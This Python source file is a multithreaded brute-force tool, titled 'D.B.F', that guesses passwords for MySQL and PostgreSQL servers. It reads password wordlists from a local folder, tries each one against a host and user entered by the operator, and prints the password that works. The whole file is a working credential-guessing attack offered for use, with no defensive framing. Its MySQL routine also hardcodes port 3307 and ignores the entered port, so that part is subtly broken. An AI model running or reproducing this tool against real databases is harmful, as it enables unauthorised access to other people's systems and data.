"""
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Author : Subhodip1307       @
D.B.F(DataBase Brute Force) @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
"""

import mysql.connector as msc
import threading as td, os,argparse,sys,psycopg2 as pgsql
from signal import SIGKILL

db_list={"mysql","postgres"}

#Create Folder
def Create_andCheck() -> bool:
    if os.path.exists('All_Pass'):
        return  True  
    os.mkdir("All_Pass")
    return True
# Check Folder
def check_folder(files_count:int) -> bool:
    all_list=os.listdir('All_Pass')
    if not all_list:
        return False
    if len(all_list) < files_count:
        print("The Folder Should Have %s files But There is Only"% files_count,len(all_list))
        return False
    return True

#return List of Files
def GetFiles(files_count:int)->list:
    all_list=os.listdir('All_Pass')
    return all_list[:files_count]

# @@@@@@@@@@@@@@@@@@@@@@@__MYSQL__@@@@@@@@@@@@@@@@@@@@
def MysqlConnect(password,host:str,port:int,user:str):
   
    try:
         msc.connect(user=user, password=f"{password}".strip(),port=3307, host=host, database=None)
    except:
        return False
    print(f"{password} is The Correct Password")
    os.kill(os.getpid(),SIGKILL)

def SQLRead_Attack(file_name:str,host:str,port:int,user:str):
    print("checking {}".format(file_name))
    passwords=open(f"All_Pass/{file_name}")
    for i in passwords.readlines():
        MysqlConnect(i,host,port,user)

def BaseMysql(threads:int):
    print("You Selected %s Threads"% threads)
    Create_andCheck()
    input(f"Please Put {threads} Passwords files in 'All_Pass' Dirctory And Press Enter")
    if not check_folder(threads):
        print('The Password Folder is Empty')
        sys.exit()
    files=GetFiles(threads)
    db_host :str=input("Enter The Host OF The Database --> ")
    db_port :int=input("Enter The Port OF The Database (default=3306)--> ")
    db_user :str=input("Enter The User OF The Database (default=root)--> ")
    for i in files:
        thread = td.Thread(target=SQLRead_Attack, args=(i,db_host,db_port or 3306,db_user or "root"))
        thread.start()
    

# @@@@@@@@@@@@@@@@@@@@@@@__POSTGRES__@@@@@@@@@@@@@@@@@@@@
def PostgresConnect(password,host:str,port:int,user:str):
    try:
      pgsql.connect(user=user, password=password.strip(),port=port, host=host)
    except:
        return False
    print(f"{password} is The Correct Password")
    os.kill(os.getpid(),SIGKILL)

def PostgresRead_Attack(file_name:str,host:str,port:int,user:str):
    print("checking {}".format(file_name))
    passwords=open(f"All_Pass/{file_name}")
    for i in passwords.readlines():
        PostgresConnect(i,host,port,user)

def PostgresBase(threads:int):
    print("You Selected %s Threads"% threads)
    Create_andCheck()
    input(f"Please Put {threads} Passwords files in 'All_Pass' Dirctory And Press Enter")
    if not check_folder(threads):
        print('The Password Folder is Empty')
        sys.exit()
    files=GetFiles(threads)
    db_host=input("Enter The Host OF The Database --> ")
    db_port:int=input("Enter The Port OF The Database (default=5432)--> ")
    db_user:str=input("Enter The User OF The Database (default=postgres)--> ")
    for i in files:
        thread = td.Thread(target=PostgresRead_Attack, args=(i,db_host,db_port or 5432,db_user or "postgres"))
        thread.start()
   



# @@@@@@@@@@@@@@@@@@@@@@@__Controler__@@@@@@@@@@@@@@@@@@@@
parser = argparse.ArgumentParser()
parser.add_argument("-th", "--Threads", help = "Numbers Of Threds")
parser.add_argument("-db", "--database", help = "Name Of The Database (MySQL,Postgres)")
args = parser.parse_args()

if args.Threads:
    threads:int=int(args.Threads)
    if (not args.database) or (not f"{args.database}".lower() in db_list):
        print(f"{args.database} Is a Invalid Input! Please try again")
        sys.exit()
    if f"{args.database}".lower()=="mysql":
        BaseMysql(int(args.Threads))
    elif f"{args.database}".lower()=="postgres":
        PostgresBase(int(args.Threads))
       
   